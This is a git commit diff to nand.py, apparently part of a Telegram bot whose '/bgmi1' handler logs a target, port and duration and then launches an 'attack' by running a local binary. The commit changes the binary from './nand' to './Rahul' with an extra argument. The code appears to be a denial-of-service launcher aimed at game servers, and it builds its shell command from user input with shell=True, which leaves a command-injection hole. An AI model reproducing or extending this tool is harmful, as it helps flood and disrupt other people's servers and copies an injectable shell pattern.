e559d56c1e749f1a43c0a6504f9b912b9cc72300
plhannakabakj <kagdhzisbabahakajjzk@outlook.com>
2025-02-17 12:01:29 +0530

    Update nand.py

--- nand.py
+++ nand.py
@@ -397,7 +397,7 @@ def handle_bgmi1(message):
                 record_command_logs(user_id, '/bgmi1', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./nand {target} {port} {time}"
+                full_command = f"./Rahul {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
 
                 # Remove from ongoing attacks once the attack completes
